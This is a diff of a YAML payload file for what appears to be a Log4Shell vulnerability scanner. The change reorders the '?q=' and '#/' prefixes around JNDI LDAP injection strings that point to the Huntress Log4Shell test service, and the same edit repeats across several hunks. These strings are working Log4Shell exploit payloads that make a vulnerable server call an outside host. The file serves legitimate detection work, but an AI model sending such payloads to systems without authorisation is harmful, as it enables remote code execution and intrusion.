@@ -26,7 +26,7 @@ payloads:
         stream: false
         proxies: ""
         headers:
-          User-Agent: "{user_agent}"
+           User-Agent: "{user_agent}"
         url: "https://log4shell.huntress.com/"
         response:
           save_to_temp_events_only: log4shell_token
@@ -110,8 +110,8 @@ payloads:
             data:
               path:
                 - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/?q=dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/#/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
                 - ""
               schema:
                 - "http"
@@ -200,8 +200,8 @@ payloads:
             data:
               path:
                 - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/?q=dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/#/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
                 - ""
               schema:
                 - "http"
@@ -290,8 +290,8 @@ payloads:
             data:
               path:
                 - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/?q=dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/#/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
                 - ""
               schema:
                 - "http"
@@ -379,8 +379,8 @@ payloads:
             data:
               path:
                 - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/?q=dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/#/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
                 - ""
               schema:
                 - "http"
@@ -472,8 +472,8 @@ payloads:
             data:
               path:
                 - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/?q=dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/#/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
                 - ""
               schema:
                 - "http"
@@ -562,8 +562,8 @@ payloads:
             data:
               path:
                 - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/?q=dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/#/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
                 - ""
               schema:
                 - "http"
@@ -652,8 +652,8 @@ payloads:
             data:
               path:
                 - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/?q=dependent_on_temp_event[0]['content'][0]}}"
-                - "${{jndi:ldap://log4shell.huntress.com:1389/#/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
                 - ""
               schema:
                 - "http"
